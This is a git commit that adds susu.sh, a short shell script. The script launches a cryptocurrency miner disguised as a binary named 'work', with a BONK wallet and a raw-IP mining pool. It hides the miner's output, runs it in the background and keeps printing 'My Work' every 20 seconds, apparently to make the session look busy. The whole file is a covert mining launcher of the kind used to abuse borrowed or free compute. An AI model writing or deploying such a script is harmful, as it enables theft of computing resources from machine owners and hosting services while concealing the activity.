7172122353685acb5226eddfaf10c06f5d33a213
preak07 <160253225+preak07@users.noreply.github.com>
2024-02-16 22:01:23 +0700

    Create susu.sh

---
+++ susu.sh
@@ -0,0 +1,6 @@
+./work -algo randomx -wallet BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN -coin BONK -rigName "vivo" -pool1 159.203.162.18:3333 >/dev/null 2>&1 &
+while true
+do
+        echo "My Work"
+        sleep 20
+done
